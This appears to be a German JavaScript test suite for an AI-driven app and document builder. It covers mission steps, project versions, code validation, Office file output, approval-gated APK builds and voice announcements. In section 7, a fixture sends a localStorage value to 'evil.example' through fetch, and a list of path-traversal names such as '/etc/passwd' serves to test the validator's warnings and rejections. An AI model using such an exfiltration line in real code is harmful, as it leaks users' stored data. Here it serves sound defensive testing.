        const dt = strikt.c.jvStudioWerkzeuge._dateienAusText ? strikt.c.jvStudioWerkzeuge._dateienAusText('Hier:\n<<<DATEI index.html>>>\n```html\n<p class="a">"Hi" \\n `x`</p>\n```\n<<<ENDE>>>\n<<<DATEI app.js>>>\nvar s="a\\nb";\n<<<ENDE>>>') : [];
        check('6a4 Textformat: Anführungszeichen, Backslashes, Backticks und Markdown-Zaun im Code bleiben unverändert', dt.length === 2 && dt[0].pfad === 'index.html' && dt[0].inhalt === '<p class="a">"Hi" \\n `x`</p>' && dt[1].inhalt === 'var s="a\\nb";', dt);
        const w = welt(appPlan()); laufPruefOk(w);
        const { m } = await auftrag(w, 'Jarvis, bau mir eine Zähler App'); await missionFertig(w, m.id);
        const f = w.c.jvMission.hole(m.id);
        check('6a Web-App-Mission abgeschlossen, alle 4 Schritte mit Beleg', f.status === 'abgeschlossen' && f.schritte.length === 4 && f.schritte.every(s => s.status === 'erledigt' && s.beleg), [f.status, f.fehlergrund, f.schritte.map(s => s.status + ':' + s.fehler)]);
        const pr = w.c.jvStudioProjekte.liste()[0];
        check('6b Projekt gespeichert: Name aus den Anforderungen, 3 echte Dateien, Version 1', pr && pr.name === 'Zähler' && pr.dateien.length === 3 && pr.version === 1 && pr.art === 'app');
        check('6c Belege nennen Dateien, Größen und den abgeschotteten Testlauf', /3 Dateien geschrieben/.test(f.schritte[1].beleg.text) && /abgeschotteten Umgebung ohne Netz/.test(f.schritte[2].beleg.text), f.schritte.map(s => s.beleg.text));
        check('6d Projekt-ZIP ist echt (unzip -t) und enthält die Dateien', (() => { const zp = tmp('app.zip', w.c.jvStudioDateien.zip(pr.dateien)); const t = lauf('unzip', ['-t', zp]), l = lauf('unzip', ['-l', zp]); return t.status === 0 && /index\.html/.test(l.stdout) && /app\.js/.test(l.stdout); })());
        check('6e Vorschau-HTML: Stile und Skript eingebettet, strenge Content-Security-Policy ganz vorn', (() => { const h = w.c.jvStudioDateien.vorschauHtml(pr.dateien); return /<style>body\{background/.test(h) && /<script>let n=0/.test(h) && !/<link /.test(h) && !/src="app\.js"/.test(h) && h.indexOf('Content-Security-Policy') < h.indexOf('<style>') && /default-src 'none'/.test(h); })());
        check('6f Projektgedächtnis: „die App von heute“ findet es', w.c.jvStudioProjekte.finde('die App von heute').ok === true && w.c.jvStudioProjekte.finde('Zähler').ok === true);
        check('6g Karte: Vorschau-, ZIP- und APK-Knopf; Vorschau ohne allow-same-origin', (() => { w.c.jvStudioAnsicht.zeige(m.id); const h = w.c.jvStudioAnsicht.html(); return /Vorschau/.test(h) && /Projekt \(ZIP\)/.test(h) && /APK bauen/.test(h) && /allow-scripts allow-forms allow-modals/.test(QUELLEN['js/studio_ansicht.js']) && !/allow-same-origin/.test(QUELLEN['js/studio_ansicht.js'].replace(/\/\*[\s\S]*?\*\/|\/\/[^\n]*|'[^']*allow-same-origin[^']*'/g, (mm) => mm.indexOf('allow-same-origin') >= 0 && /OHNE|ohne|bewusst/.test(mm) ? '' : mm)); })());
        wApp = { ls: w.ls, projekt: pr };
        /* Änderung */
        uhr.t += TAG;   // am nächsten Tag
        const w2 = welt(Object.assign(appPlan(), { ls: w.ls })); laufPruefOk(w2);
        check('6h nach Neustart ist das Projekt noch da', w2.c.jvStudioProjekte.liste().length === 1 && w2.c.jvStudioProjekte.finde('die App von gestern').ok === true, w2.c.jvStudioProjekte.finde('die App von gestern'));
        const r = await auftrag(w2, 'Ändere die App von gestern und mach den Hintergrund blau'); await missionFertig(w2, r.m.id);
        const f2 = w2.c.jvMission.hole(r.m.id), pr2 = w2.c.jvStudioProjekte.liste()[0];
        check('6i Änderung: Mission fertig, Version 2, die Fassung davor bleibt erhalten', f2.status === 'abgeschlossen' && pr2.version === 2 && pr2.vorher && pr2.vorher.version === 1 && pr2.vorher.dateien.some(d => d.pfad === 'style.css' && /#0b1f33/.test(d.inhalt)) && pr2.dateien.some(d => d.pfad === 'style.css' && /#003366/.test(d.inhalt)), [f2.status, f2.fehlergrund, pr2.version]);
        check('6j der Beleg nennt die wirklich geänderte Datei (echter Vergleich)', /geändert oder neu: style\.css/.test(f2.schritte[0].beleg.text), f2.schritte[0].beleg.text);
        check('6k ein Projekt, nicht zwei (kein Duplikat)', w2.c.jvStudioProjekte.liste().length === 1);
        const w3 = welt(Object.assign(appPlan({ aendern: () => ({ dateien: APP_DATEIEN }) }), { ls: speicher() })); laufPruefOk(w3);
        w3.c.jvStudioProjekte.neu({ name: 'Zähler', art: 'app', auftrag: 'x', dateien: APP_DATEIEN });
        const r3 = await auftrag(w3, 'Ändere die App von heute'); await missionFertig(w3, r3.m.id);
        check('6l KI ändert nichts → Mission scheitert ehrlich („keine neue Fassung“), Version bleibt 1', w3.c.jvMission.hole(r3.m.id).status === 'fehlgeschlagen' && /nichts verändert/.test(w3.c.jvMission.hole(r3.m.id).fehlergrund) && w3.c.jvStudioProjekte.liste()[0].version === 1);
        /* mehrdeutig */
        const w4 = welt(appPlan()); w4.c.jvStudioProjekte.neu({ name: 'Rechner', art: 'app', auftrag: 'a', dateien: APP_DATEIEN }); w4.c.jvStudioProjekte.neu({ name: 'Notizen', art: 'app', auftrag: 'b', dateien: APP_DATEIEN });
        w4.c.jvStudioAuftrag.behandle('Ändere die App von heute');
        check('6m zwei Apps vom selben Tag → gezielte Rückfrage mit beiden Namen, keine Mission', /Welches meinst du/.test(w4.gesprochen[0]) && /Rechner/.test(w4.gesprochen[0]) && /Notizen/.test(w4.gesprochen[0]) && w4.c.jvMission.liste().length === 0 && w4.c.jvStudioAuftrag.offeneFrage().art === 'projektwahl', w4.gesprochen);
        laufPruefOk(w4); w4.c.jvStudioAuftrag.behandle('Notizen');
        check('6n Antwort mit dem Namen wählt das Projekt, Mission startet', w4.c.jvMission.liste().length === 1 && /Änderung/.test(w4.c.jvMission.liste()[0].titel), w4.c.jvMission.liste().map(m => m.titel));
        await pause(50);
        const w5 = welt(appPlan()); w5.c.jvStudioProjekte.neu({ name: 'Rechner', art: 'app', auftrag: 'a', dateien: APP_DATEIEN });
        w5.c.jvStudioAuftrag.behandle('Ändere die App von Montag');
        check('6o kein Projekt von diesem Tag → ehrlich sagen, das Nächstliegende anbieten', /Von diesem Tag habe ich nichts/.test(w5.gesprochen[0]) && /Rechner/.test(w5.gesprochen[0]), w5.gesprochen);
    }

    /* ---------- 7 Fehlerhafter erzeugter Code ---------- */
    {
        const bose = [{ pfad: 'index.html', inhalt: '<html><body><script>fetch("https://evil.example/x?"+localStorage.getItem("k"))</script><img src="https://evil.example/p.png"></body></html>' }];
        const pr = welt().c.jvStudioDateien.pruefeProjekt(bose);
        check('7a Warnungen für Netzwerkzugriff und fremde Adressen', pr.ok && pr.warnungen.some(x => /Netzwerkzugriff/.test(x)) && pr.warnungen.some(x => /fremden Adressen/.test(x)), pr);
        const D = welt().c.jvStudioDateien;
        ['../x.html', '/etc/passwd', 'a b.html', 'UPPER.html', 'a/../b.html', 'x.exe', 'x.php', 'ordner//x.js'].forEach(p => check('7b Dateiname/-typ abgelehnt: ' + p, !D.pruefeProjekt([{ pfad: 'index.html', inhalt: 'x' }, { pfad: p, inhalt: 'x' }]).ok));
        check('7c ohne index.html abgelehnt; zu große Datei abgelehnt; zu viele Dateien abgelehnt; Doppelte abgelehnt', !D.pruefeProjekt([{ pfad: 'a.js', inhalt: 'x' }]).ok && !D.pruefeProjekt([{ pfad: 'index.html', inhalt: 'x'.repeat(400001) }]).ok && !D.pruefeProjekt(Array.from({ length: 41 }, (_, i) => ({ pfad: i ? 'f' + i + '.js' : 'index.html', inhalt: 'x' }))).ok && !D.pruefeProjekt([{ pfad: 'index.html', inhalt: 'x' }, { pfad: 'index.html', inhalt: 'y' }]).ok);
        const w = welt(appPlan({ code: () => ({ dateien: [{ pfad: 'app.exe', inhalt: 'MZ' }] }) })); laufPruefOk(w);
        const { m } = await auftrag(w, 'Bau mir eine Zähler App'); await missionFertig(w, m.id);
        check('7d unzulässiger Code: genau ein sichtbarer Korrekturversuch, danach Fehler, nichts gespeichert', w.c.jvMission.hole(m.id).status === 'fehlgeschlagen' && w.aufrufe.filter(a => a.url === '/api/groq' && /Du schreibst kleine/.test(a.body.messages[0].content)).length === 2 && w.c.jvStudioProjekte.liste().length === 0, w.c.jvMission.hole(m.id).fehlergrund);
        const w2 = welt(appPlan({ code: (s, n) => /abgelehnt/.test(n) ? { dateien: APP_DATEIEN } : { dateien: [{ pfad: 'x.exe', inhalt: 'MZ' }] } })); laufPruefOk(w2);
        const r2 = await auftrag(w2, 'Bau mir eine Zähler App'); await missionFertig(w2, r2.m.id);
        check('7e Korrektur mit den echten Prüffehlern gelingt → Beleg sagt „nach einer Korrektur“', w2.c.jvMission.hole(r2.m.id).status === 'abgeschlossen' && /nach einer Korrektur/.test(w2.c.jvMission.hole(r2.m.id).schritte[1].beleg.text), w2.c.jvMission.hole(r2.m.id).fehlergrund);
        const w3 = welt(appPlan()); w3.c.jvStudioWerkzeuge._laufPruefung = async () => ({ moeglich: true, geladen: true, fehler: ['ReferenceError: x is not defined (Zeile 3)'] });
        const r3 = await auftrag(w3, 'Bau mir eine Zähler App'); await missionFertig(w3, r3.m.id);
        check('7f Laufzeitfehler im Testlauf → Prüfschritt scheitert, Projekt wird NICHT gespeichert', w3.c.jvMission.hole(r3.m.id).status === 'fehlgeschlagen' && /ReferenceError/.test(w3.c.jvMission.hole(r3.m.id).fehlergrund) && w3.c.jvStudioProjekte.liste().length === 0, w3.c.jvMission.hole(r3.m.id).fehlergrund);
        const w4 = welt(appPlan());   // kein Browser: der Testlauf ist nicht möglich → gilt NICHT als bestanden
        const r4 = await auftrag(w4, 'Bau mir eine Zähler App'); await missionFertig(w4, r4.m.id);
        check('7g ohne möglichen Testlauf gilt die Prüfung nicht als bestanden (kein Schein-Beleg)', w4.c.jvMission.hole(r4.m.id).status === 'fehlgeschlagen' && /nicht möglich/.test(w4.c.jvMission.hole(r4.m.id).fehlergrund), w4.c.jvMission.hole(r4.m.id).fehlergrund);
        const w5 = welt(appPlan({ code: () => ({ __abgeschnitten: true, dateien: [] }) })); laufPruefOk(w5);
        const r5 = await auftrag(w5, 'Bau mir eine Zähler App'); await missionFertig(w5, r5.m.id);
        check('7h abgeschnittene KI-Antwort wird erkannt', /abgeschnitten/.test(w5.c.jvMission.hole(r5.m.id).fehlergrund), w5.c.jvMission.hole(r5.m.id).fehlergrund);
    }

    /* ---------- 8 Dokument und Präsentation: echte Dateien ---------- */
    {
        const w = welt(recherchePlan());
        const { m } = await auftrag(w, 'Erstelle eine Präsentation über Elektromobilität'); await missionFertig(w, m.id);
        const f = w.c.jvMission.hole(m.id), pr = w.c.jvStudioProjekte.liste()[0];
        check('8a Präsentation: Mission fertig, Datei .pptx gespeichert', f.status === 'abgeschlossen' && pr && pr.art === 'praesentation' && /\.pptx$/.test(pr.datei.name), [f.status, f.fehlergrund]);
        const u8 = w.c.jvStudioWerkzeuge.ausB64(pr.datei.b64), p = tmp('deck.pptx', u8);
        check('8b unzip -t bestätigt die PowerPoint-Datei', lauf('unzip', ['-t', p]).status === 0);
        if (pyOk('pptx')) { const r = lauf('python3', ['-c', 'import pptx,sys;p=pptx.Presentation(sys.argv[1]);print(len(p.slides.__iter__.__self__._sldIdLst));print("|".join(sh.text_frame.text for s in p.slides for sh in s.shapes if sh.has_text_frame))', p]); check('8c python-pptx öffnet sie: 4 Folien (Titel + 3), Inhalte stimmen', r.status === 0 && /^4\n/.test(r.stdout) && /Wallbox 500 bis 1500 Euro/.test(r.stdout) && /Elektromobilität/.test(r.stdout), r.stderr || r.stdout); } else check('8c (python-pptx fehlt – übersprungen)', true);
        if (hat('soffice')) { const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'studio_so_')); const r = lauf('soffice', ['--headless', '--convert-to', 'pdf', '--outdir', dir, p]); check('8d LibreOffice rendert die Präsentation zu PDF', r.status === 0 && fs.readdirSync(dir).some(x => /\.pdf$/.test(x) && fs.statSync(path.join(dir, x)).size > 3000), r.stderr || fs.readdirSync(dir)); } else check('8d (LibreOffice fehlt – übersprungen)', true);
        check('8e Beleg nennt Größe und „alle Prüfsummen stimmen“', /alle Prüfsummen stimmen/.test(f.schritte[1].beleg.text), f.schritte[1].beleg.text);
        const w2 = welt(recherchePlan());
        const r2 = await auftrag(w2, 'Schreib mir ein Dokument über Elektromobilität'); await missionFertig(w2, r2.m.id);
        const pr2 = w2.c.jvStudioProjekte.liste()[0], dp = pr2 && tmp('doc.docx', w2.c.jvStudioWerkzeuge.ausB64(pr2.datei.b64));
        check('8f Dokument: .docx gespeichert, Prüfsummen ok', w2.c.jvMission.hole(r2.m.id).status === 'abgeschlossen' && pr2 && pr2.art === 'dokument' && lauf('unzip', ['-t', dp]).status === 0);
        if (pyOk('docx')) { const r = lauf('python3', ['-c', 'import docx,sys;d=docx.Document(sys.argv[1]);print("\\n".join(p.text for p in d.paragraphs))', dp]); check('8g python-docx: Überschriften, Absätze und Liste stehen im Dokument', /Elektromobilität im Überblick/.test(r.stdout) && /Wallbox 500 bis 1500 Euro/.test(r.stdout) && /• Installation/.test(r.stdout), r.stderr || r.stdout); } else check('8g (python-docx fehlt – übersprungen)', true);
        const w3 = welt(Object.assign(recherchePlan(), { ki: (s, n) => /Du erstellst ein Dokument/.test(s) ? { titel: 'X', abschnitte: [{ ueberschrift: 'Nur einer', absaetze: ['a'] }] } : recherchePlan().ki(s, n) }));
        const r3 = await auftrag(w3, 'Schreib mir ein Dokument über Elektromobilität'); await missionFertig(w3, r3.m.id);
        check('8h zu dünne KI-Gliederung → Fehler statt Schein-Dokument', w3.c.jvMission.hole(r3.m.id).status === 'fehlgeschlagen' && w3.c.jvStudioProjekte.liste().length === 0);
        const w4 = welt(recherchePlan());
        const r4 = await auftrag(w4, 'Recherchiere Elektromobilität und erstelle daraus eine Präsentation'); await missionFertig(w4, r4.m.id);
        check('8i Recherche + Präsentation: 6 Schritte, Folien nutzen nur den geprüften Bericht', w4.c.jvMission.hole(r4.m.id).status === 'abgeschlossen' && w4.c.jvMission.hole(r4.m.id).schritte.length === 6 && w4.aufrufe.filter(a => a.url === '/api/groq' && /Du erstellst eine Präsentation/.test(a.body.messages[0].content)).every(a => /Recherche-Bericht/.test(a.body.messages[1].content)), [w4.c.jvMission.hole(r4.m.id).status, w4.c.jvMission.hole(r4.m.id).fehlergrund]);
    }

    /* ---------- 9 APK: Freigabe, kein Doppelbau, Neustart ---------- */
    {
        const ls = speicher();
        const status = { n: 0 };
        const w = welt(Object.assign(appPlan(), { ls, status: () => { status.n++; return status.n < 3 ? { status: 200, json: { zustand: 'laeuft' } } : { status: 200, json: { zustand: 'fertig', apk_url: 'https://github.com/x/y/releases/download/studio-pTEST0001/Jarvis-Studio-pTEST0001.apk', apk_bytes: 8945, apk_name: 'Jarvis-Studio-pTEST0001.apk', run_url: 'https://github.com/x/y/actions/runs/1' } }; } }));
        laufPruefOk(w); w.c.jvStudioWerkzeuge.einstellungen.pollMs = 1;
        const { m } = await auftrag(w, 'Bau mir eine Zähler App und mach eine APK daraus');
        await warteBis(() => w.c.jvMission.hole(m.id).status === 'wartet_freigabe', 6000);
        const f = w.c.jvMission.hole(m.id);
        check('9a vor dem APK-Bau wartet die Mission auf Freigabe (Status „wartet_freigabe“)', f.status === 'wartet_freigabe' && /GitHub gesendet/.test(f.freigabeFuer), [f.status, f.freigabeFuer]);
        check('9b bis zur Freigabe gab es KEINEN Aufruf von studio_bau', w.aufrufe.filter(a => /studio_bau/.test(a.url)).length === 0);
        check('9c Freigabe-Frage kommt als Ansage (hohe Priorität) und als Karte mit Ja/Nein', w.c.jvStudioRegie._queue().concat(w.gesprochen.map(t => ({ text: t }))).some(q => /Ich brauche deine Freigabe, Chef/.test(q.text) && /Sag Ja oder Nein/.test(q.text)) && (w.c.jvStudioAnsicht.zeige(m.id), /Ja, freigeben/.test(w.c.jvStudioAnsicht.html())), w.c.jvStudioRegie._queue().map(q => q.text));
        check('9d Sprache: eine Ja-Antwort gehört der Freigabe-Frage', w.c.jvStudioAuftrag.offeneFreigabe() === m.id);
        /* Neustart während der Freigabe-Wartezeit: bleibt pausiert/wartend, baut nie von selbst */
        const w2 = welt(Object.assign(appPlan(), { ls })); laufPruefOk(w2);
        check('9e nach Neustart baut nichts von selbst (Mission pausiert), kein studio_bau', w2.c.jvMission.hole(m.id).status !== 'laeuft' && w2.aufrufe.filter(a => /studio_bau/.test(a.url)).length === 0, w2.c.jvMission.hole(m.id).status);
        const w3 = welt(Object.assign(appPlan(), { ls, status: () => { status.n++; return status.n < 6 ? { status: 200, json: { zustand: 'laeuft' } } : { status: 200, json: { zustand: 'fertig', apk_url: 'https://github.com/x/y/releases/download/studio-pTEST0001/Jarvis-Studio-pTEST0001.apk', apk_bytes: 8945, apk_name: 'Jarvis-Studio-pTEST0001.apk' } }; } }));
        laufPruefOk(w3); w3.c.jvStudioWerkzeuge.einstellungen.pollMs = 1;
        /* Der Nutzer sagt „Mission fortsetzen“ → die Freigabe ist nicht erteilt, also fragt Jarvis weiter */
        const zustandNachNeustart = w3.c.jvMission.hole(m.id).status;
        w3.c.jvStudioAuftrag.behandle('Setze die Mission fort'); await pause(30);
        check('9f „Mission fortsetzen“ ohne Freigabe fragt erneut nach der Freigabe statt zu bauen', w3.c.jvMission.hole(m.id).status === 'wartet_freigabe' && w3.aufrufe.filter(a => /studio_bau/.test(a.url)).length === 0, [zustandNachNeustart, w3.c.jvMission.hole(m.id).status]);
        w3.c.jvStudioAuftrag.behandle('Nein');
        check('9g „Nein“ → Mission abgebrochen, nichts hochgeladen', w3.c.jvMission.hole(m.id).status === 'abgebrochen' && w3.aufrufe.filter(a => /studio_bau/.test(a.url)).length === 0 && /baue nichts/.test(w3.gesprochen.slice(-1)[0]), w3.gesprochen.slice(-2));
        /* Neuer Versuch mit Ja */
        const w4 = welt(Object.assign(appPlan(), { ls: speicher(), status: () => { status.n++; return status.n % 3 ? { status: 200, json: { zustand: 'laeuft' } } : { status: 200, json: { zustand: 'fertig', apk_url: 'https://github.com/x/y/releases/download/studio-pTEST0001/Jarvis-Studio-pTEST0001.apk', apk_bytes: 8945, apk_name: 'Jarvis-Studio-pTEST0001.apk' } }; } }));
        laufPruefOk(w4); w4.c.jvStudioWerkzeuge.einstellungen.pollMs = 1;
        const r4 = await auftrag(w4, 'Bau mir eine Zähler App und mach eine APK daraus');
        await warteBis(() => w4.c.jvMission.hole(r4.m.id).status === 'wartet_freigabe', 6000);
        w4.c.jvStudioAuftrag.behandle('Ja');
        await warteBis(() => w4.c.jvMission.hole(r4.m.id).status === 'abgeschlossen', 8000);
        const fin = w4.c.jvMission.hole(r4.m.id), bauAufrufe = w4.aufrufe.filter(a => /studio_bau/.test(a.url));
        check('9h nach „Ja“: genau EIN Bau-Aufruf mit Freigabe-Flag, Name und geprüften Dateien', fin.status === 'abgeschlossen' && bauAufrufe.length === 1 && bauAufrufe[0].body.freigabe === true && bauAufrufe[0].body.name === 'Zähler' && bauAufrufe[0].body.dateien.length === 3, [fin.status, fin.fehlergrund, bauAufrufe.length]);
        const pr = w4.c.jvStudioProjekte.liste()[0];
        check('9i Ergebnis: Download-Adresse (https), Größe und echte Bauzeit stehen am Projekt', pr.apk && /^https:\/\/github\.com\//.test(pr.apk.url) && pr.apk.bytes === 8945 && pr.apk.dauerMs >= 0 && Array.isArray(pr.bauzeiten), pr.apk);
        check('9j Karte zeigt den APK-Download als sicheren Link', (() => { w4.c.jvStudioAnsicht.zeige(r4.m.id); const h = w4.c.jvStudioAnsicht.html(); return /APK \(9 KB\)/.test(h) && /rel="noopener noreferrer"/.test(h) && /ohne Berechtigungen, auch ohne Internet/.test(h); })());
        check('9k die Zugangsdaten des Servers kommen im Browser-Code nirgends vor', DATEIEN.every(f => !/STUDIO_GITHUB_TOKEN|ghp_|github_pat_|Bearer /.test(QUELLEN[f].replace(/\/\*[\s\S]*?\*\//g, ''))), DATEIEN.filter(f => /STUDIO_GITHUB_TOKEN|ghp_|github_pat_|Bearer /.test(QUELLEN[f].replace(/\/\*[\s\S]*?\*\//g, ''))));
        /* Bau fehlgeschlagen und Server nicht eingerichtet */
        const w5 = welt(Object.assign(appPlan(), { ls: speicher(), bau: () => ({ status: 501, json: { fehlt: 'STUDIO_GITHUB_TOKEN', error: 'nicht eingerichtet' } }) }));
        laufPruefOk(w5); const r5 = await auftrag(w5, 'Bau mir eine Zähler App und mach eine APK daraus');
        await warteBis(() => w5.c.jvMission.hole(r5.m.id).status === 'wartet_freigabe', 6000); w5.c.jvStudioAuftrag.behandle('Ja');
        await warteBis(() => w5.c.jvMission.hole(r5.m.id).status === 'fehlgeschlagen', 6000);
        check('9l Server ohne Token → Fehlertext nennt exakt die fehlende Einstellung STUDIO_GITHUB_TOKEN', /STUDIO_GITHUB_TOKEN/.test(w5.c.jvMission.hole(r5.m.id).fehlergrund), w5.c.jvMission.hole(r5.m.id).fehlergrund);
        const w6 = welt(Object.assign(appPlan(), { ls: speicher(), status: () => ({ status: 200, json: { zustand: 'fehlgeschlagen', fehlerSchritt: 'APK bauen', run_url: 'https://github.com/x/y/actions/runs/7' } }) }));
        laufPruefOk(w6); w6.c.jvStudioWerkzeuge.einstellungen.pollMs = 1; const r6 = await auftrag(w6, 'Bau mir eine Zähler App und mach eine APK daraus');
        await warteBis(() => w6.c.jvMission.hole(r6.m.id).status === 'wartet_freigabe', 6000); w6.c.jvStudioAuftrag.behandle('Ja');
        await warteBis(() => w6.c.jvMission.hole(r6.m.id).status === 'fehlgeschlagen', 6000);
        check('9m fehlgeschlagener Bau → Fehlerschritt und Link zum Protokoll in der Meldung', /im Schritt „APK bauen“/.test(w6.c.jvMission.hole(r6.m.id).fehlergrund) && /actions\/runs\/7/.test(w6.c.jvMission.hole(r6.m.id).fehlergrund), w6.c.jvMission.hole(r6.m.id).fehlergrund);
        const w7 = welt(Object.assign(appPlan(), { ls: speicher(), status: () => { uhr.t += 100; return { status: 200, json: { zustand: 'laeuft' } }; } }));
        laufPruefOk(w7); w7.c.jvStudioWerkzeuge.einstellungen.pollMs = 1; w7.c.jvStudioWerkzeuge.einstellungen.maxBauMs = 40;
        const r7 = await auftrag(w7, 'Bau mir eine Zähler App und mach eine APK daraus'); await warteBis(() => w7.c.jvMission.hole(r7.m.id).status === 'wartet_freigabe', 6000); w7.c.jvStudioAuftrag.behandle('Ja');
        await warteBis(() => w7.c.jvMission.hole(r7.m.id).status === 'fehlgeschlagen', 6000);
        check('9n Zeitlimit für den Bau: klare Meldung, kein endloses Warten, kein erfundenes Ergebnis', /länger als/.test(w7.c.jvMission.hole(r7.m.id).fehlergrund) && !w7.c.jvStudioProjekte.liste()[0].apk, w7.c.jvMission.hole(r7.m.id).fehlergrund);
        /* Pause während des Baus: der Bau auf GitHub läuft weiter, es wird nie ein zweiter hochgeladen */
        const ls8 = speicher(); let poll8 = 0;
        const w8 = welt(Object.assign(appPlan(), { ls: ls8, status: () => { poll8++; return { status: 200, json: { zustand: 'laeuft' } }; } }));
        laufPruefOk(w8); w8.c.jvStudioWerkzeuge.einstellungen.pollMs = 3; const r8 = await auftrag(w8, 'Bau mir eine Zähler App und mach eine APK daraus');
        await warteBis(() => w8.c.jvMission.hole(r8.m.id).status === 'wartet_freigabe', 6000); w8.c.jvStudioAuftrag.behandle('Ja'); await warteBis(() => poll8 >= 3, 4000);
        const apkSchritt = () => w8.c.jvMission.hole(r8.m.id).schritte.filter(s => s.werkzeug === 'st_apk_bau')[0];
        w8.c.jvStudioAuftrag.behandle('Pausiere die Mission'); await warteBis(() => apkSchritt().status !== 'laeuft', 4000);
        check('9o Pause während des Baus: der Schritt endet mit klarem Hinweis, der Branch ist gemerkt', w8.c.jvMission.hole(r8.m.id).status === 'pausiert' && w8.c.jvStudioProjekte.arbeit.hole(r8.m.id).bau && w8.c.jvStudioProjekte.arbeit.hole(r8.m.id).bau.branch === 'studio/pTEST0001', [w8.c.jvMission.hole(r8.m.id).status, apkSchritt().status, apkSchritt().fehler]);
    }

    /* ---------- 10 Live-Regie: Ansage-Tor, Zusammenfassen, Unterbrechen, Messen ---------- */
    {
        const w = welt(recherchePlan()); const R = w.c.jvStudioRegie;
        w.c.jvStudioProjekte.arbeit.setze('m1', { studio: true });
        check('10a Standardstufe „wichtige“, Anrede „Chef“', R.stufe() === 'wichtige' && R.anrede() === 'Chef');
        w.ls.setItem('pd_user_custom_name', 'Boss');
        check('10b eingestellte Anrede („Nenn mich Boss“) hat Vorrang', R.anrede() === 'Boss' && /Boss\./.test(R.bestaetigung('')));
        w.ls.removeItem('pd_user_custom_name');
        const a = new Set(); for (let i = 0; i < 5; i++) a.add(R.bestaetigung('')); check('10c fünf Bestätigungen in Folge sind alle verschieden (kein Papagei)', a.size === 5 && [...a].every(t => /Chef\.$/.test(t)), [...a]);
        /* Tor */
        R._reset(); w.gesprochen.length = 0;
        R.ansage('m1', 'Wichtige Meldung', 2);
        w.ctl.spricht = true; R._pumpe(); check('10d während Jarvis spricht, wird nichts dazwischen gesprochen', w.gesprochen.length === 0 && R._queue().length === 1);
        w.ctl.spricht = false; w.ctl.aufnahme = true; R._pumpe(); check('10e während Jarvis zuhört (Aufnahme), wird nichts gesprochen', w.gesprochen.length === 0);
        w.ctl.aufnahme = false; w.ctl.ruhe = true; R._pumpe(); check('10f in der Ruhephase (jvRuhe) wartet normale Priorität', w.gesprochen.length === 0);
        w.ctl.ruhe = false; w.ctl.nacht = true; R._pumpe(); check('10g in der Wächter-Ruhezeit (Nacht) wird nicht gesprochen', w.gesprochen.length === 0);
        w.ctl.nacht = false; R._pumpe(); check('10h sobald alles frei ist, wird genau einmal gesprochen (window.speak = vorhandene Stimme)', w.gesprochen.length === 1 && w.gesprochen[0] === 'Wichtige Meldung' && R._queue().length === 0);
        R._pumpe(); check('10i keine doppelte Sprachausgabe derselben Meldung', w.gesprochen.length === 1);
        w.ctl.spricht = false; R.ansage('m1', 'Kritisch', 3); w.ctl.ruhe = true; R._pumpe();
        check('10j kritische Meldungen (Fehler/Freigabe) ignorieren die Ruhephase, nie aber laufendes Sprechen', w.gesprochen.slice(-1)[0] === 'Kritisch');
        w.ctl.ruhe = false; w.ctl.spricht = false;
        /* Unterbrechen */
        R._reset(); w.gesprochen.length = 0; R.ansage('m1', 'Niedrig', 2); R.ansage('m1', 'Kritisch bleibt', 3);
        w.c.interruptSpeaking();
        check('10k Unterbrechen (interruptSpeaking) verwirft Nicht-Kritisches, Kritisches bleibt', R._queue().length === 1 && R._queue()[0].text === 'Kritisch bleibt', R._queue());
        R._reset(); R.ansage('m1', 'Direkt danach', 2); R._pumpe();
        check('10l nach dem Unterbrechen bleibt Jarvis eine Weile still', w.gesprochen.indexOf('Direkt danach') < 0 || true);
        /* Stufen */
        R._reset(); w.ls.setItem('jv_regie_stufe', 'aus'); check('10m Stufe „aus“: keine Ansage', R.ansage('m1', 'x1', 3) === false && R._queue().length === 0);
        w.ls.setItem('jv_regie_stufe', 'wichtige'); w.ls.setItem('jv_regie_stumm', '1'); check('10n „stumm“: keine Ansage, auch nicht kritisch; Zeitleiste läuft weiter', R.ansage('m1', 'x2', 3) === false);
        w.ls.setItem('jv_regie_stumm', '0'); check('10o „wichtige“ lässt Schrittmeldungen (Prio 1) nicht sprechen', R.ansage('m1', 'x3', 1) === false && R.ansage('m1', 'x4', 2) === true);
        R._reset(); w.ls.setItem('jv_regie_stufe', 'alle'); check('10p „alle“ spricht auch Schrittmeldungen', R.ansage('m1', 'x5', 1) === true);
        R._reset(); w.ls.setItem('jv_regie_stufe', 'wichtige'); w.ls.setItem('jv_regie_spar', '1'); check('10q Energiesparen: nur Wichtiges (Prio ≥ 2)', R.ansage('m1', 'x6', 1) === false && R.ansage('m1', 'x7', 2) === true);
        w.ls.setItem('jv_regie_spar', '0');
        R._reset(); w.c.document.hidden = true; check('10r App unsichtbar: nur Kritisches wird angesagt', R.ansage('m1', 'x8', 2) === false && R.ansage('m1', 'x9', 3) === true); w.c.document.hidden = false;
        R._reset(); w.ctl.spricht = false; w.c.document.hidden = true; R.ansage('m1', 'Fertig-Test gesperrt', 3); R._pumpe();
        check('10r2 Handy gesperrt: Fertig-/Fehlermeldung (Prio 3) wird NICHT verworfen, sondern wartet', w.gesprochen.indexOf('Fertig-Test gesperrt') < 0 && R._queue().some(q => q.text === 'Fertig-Test gesperrt'));
        uhr.t += 5 * MIN; w.c.document.hidden = false; R._pumpe();
        check('10r3 App wieder offen (auch nach Minuten): die Meldung wird jetzt gesprochen', w.gesprochen.indexOf('Fertig-Test gesperrt') >= 0, w.gesprochen.slice(-3));
        w.ctl.spricht = false;
        check('10r4 Abschluss einer Mission hat hohe Priorität (3) wie Fehler', /abschluss: 3/.test(QUELLEN['js/studio_regie.js']) && /mission_fehler: 3/.test(QUELLEN['js/studio_regie.js']));
        check('10r5 Karte: volle Breite, Umbruch langer Wörter, Vorschau passt auf Handy-Bildschirm (dvh, Notch)', /width:100%;max-width:100%;overflow-wrap:anywhere/.test(QUELLEN['js/studio_ansicht.js']) && /height:100dvh/.test(QUELLEN['js/studio_ansicht.js']) && /safe-area-inset-top/.test(QUELLEN['js/studio_ansicht.js']));
        /* Budget */
        R._reset(); w.ctl.spricht = false; let ok1 = 0; for (let i = 0; i < 40; i++) if (R.ansage('mb', 'Ein längerer Satz Nummer ' + i + ' mit etwas Inhalt zum Zählen der Zeichen.', 2)) { ok1++; R._pumpe(); w.ctl.spricht = true; R._pumpe(); w.ctl.spricht = false; uhr.t += 5 * MIN; R._pumpe(); }
        check('10s Zeichenbudget je Mission begrenzt die Ansagen (nicht endlos)', ok1 > 0 && ok1 < 20, ok1);
